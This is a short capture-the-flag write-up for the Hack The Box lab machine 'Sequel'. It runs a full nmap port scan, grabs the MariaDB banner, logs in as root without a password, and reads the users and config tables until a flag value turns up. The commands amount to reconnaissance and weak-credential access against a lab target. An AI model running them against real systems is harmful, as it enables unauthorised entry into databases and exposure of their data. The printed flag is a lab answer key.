# Sequel

With the following IP: 10.129.95.232

```bash
nmap -p- 10.129.95.232 -oA fullport --min-rate=10000
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-10 19:48 -03                      
Nmap scan report for 10.129.95.232 (10.129.95.232)                                   
Host is up (0.20s latency).                                                          
Not shown: 65534 closed ports                                                        
PORT     STATE SERVICE
3306/tcp open  mysql 
```

```bash
dyallo in ~ λ telnet 10.129.95.232 3306                                            
Trying 10.129.95.232...                                                              
Connected to 10.129.95.232.
Escape character is '^]'.
5.5.5-10.3.27-MariaDB-0+deb10u13"f^#3toS-19h"n
```

Now we now that the machine is running a MariaDB server. We are going to use the `mysql` client to connect to the server. (Assuming that the server has weak credentials)

```bash
mysql -h 10.129.95.232 -u root
```

```bash
Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                                                                 
Your MySQL connection id is 54                                                                                                                                            
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10                                                                                                                 
                                                                                                                                                                          
Copyright (c) 2000, 2024, Oracle and/or its affiliates.                                                                                                                   
                                                                                                                                                                          
Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                         
affiliates. Other names may be trademarks of their respective                                                                                                             
owners.                                                                                                                                                                   
                                                                                                                                                                          
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                            
                                                                                                                                                                          
mysql> use htb;                                                                                                                                                           
Reading table information for completion of table and column names                                                                                                        
You can turn off this feature to get a quicker startup with -A                                                                                                            
                                                                                                                                                                          
Database changed                                                                                                                                                          
mysql> SHOW DATABASES;
```

```shell
+--------------------+                                                                                                                                                    
| Database           |                                                                                                                                                    
+--------------------+                                                                                                                                                    
| htb                |                                                                                                                                                    
| information_schema |                                                                                                                                                    
| mysql              |                                                                                                                                                    
| performance_schema |                                                                                                                                                    
+--------------------+
```

We want to use the htb database.

```bash
mysql> use htb;
```

```bash
Database changed
```

```bash
mysql> SHOW TABLES;
```

```bash
+---------------+                         
| Tables_in_htb |                         
+---------------+                         
| config        |                         
| users         |                         
+---------------+ 
```

Let's see the content of the `users` table.

```bash
mysql> SELECT * FROM users;
```

```bash
mysql> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

Nothing interesting here. Let's see the content of the `config` table.

```bash
mysql> SELECT * FROM config;
```

```bash
+----+-----------------------+----------------------------------+                    
| id | name                  | value                            |                    
+----+-----------------------+----------------------------------+                    
|  1 | timeout               | 60s                              |                    
|  2 | security              | default                          |                    
|  3 | auto_logon            | false                            |                    
|  4 | max_size              | 2M                               |                    
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |                    
|  6 | enable_uploads        | false                            |                    
|  7 | authentication_method | radius                           |                    
+----+-----------------------+----------------------------------+ 
```

We have the flag!

https://www.hackthebox.com/achievement/machine/834305/403